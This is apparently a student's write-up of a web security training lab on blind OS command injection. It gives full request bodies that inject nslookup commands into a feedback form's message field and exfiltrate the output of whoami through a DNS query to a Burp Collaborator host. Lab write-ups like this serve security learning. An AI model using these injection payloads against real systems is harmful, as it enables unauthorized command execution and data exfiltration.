# Lab: Blind OS command injection with out-of-band data exfiltration

>This lab contains a blind OS command injection vulnerability in the feedback function.

>The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

>To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

### Colaborator
My burp collaborator link `8ktdn4s4idaxqhu21a180ju06rch06.burpcollaborator.net`

### Vulnerable area
`POST /feedback/submit`

### DNS lookup
Made a dns lookup to my collaborator instance with the following payload: 

<pre>csrf=jT692ZRhuzxNTU8g5ugNS7Tqp21bWDXa&name=niko&email=niko%40mail.com&subject=mad&message=mad;`nslookup 8ktdn4s4idaxqhu21a180ju06rch06.burpcollaborator.net`</pre>

Used command separator `;` and surrounded the nslookup command with backticks. I did this because we are executing the ping command *within* the command passed to the server (containing feedback info)

### Exfiltrating data
This payload allowed me to exfiltrate the output of `whoami`:

<pre>csrf=hwBMhsam0pAASxFpWIunrcbUlGg3YqjU&name=niko&email=niko%40mail.com&subject=mad&message=mad;`nslookup $(whoami).8ktdn4s4idaxqhu21a180ju06rch06.burpcollaborator.net`</pre>

This took some trial and error. I tried surrounding the `whoami` command with backticks, but that didn't work. Eventually I realized that `$(whoami)` is the correct syntax. We basically want to output the `whoami` output to a subdomain of my collaborator server. When the DNS request is sent, we can see the output of the `whoami` command.

Our collaborator shows `peter-y9HtnE.8ktdn4s4idaxqhu21a180ju06rch06.burpcollaborator.net`

Lab solved!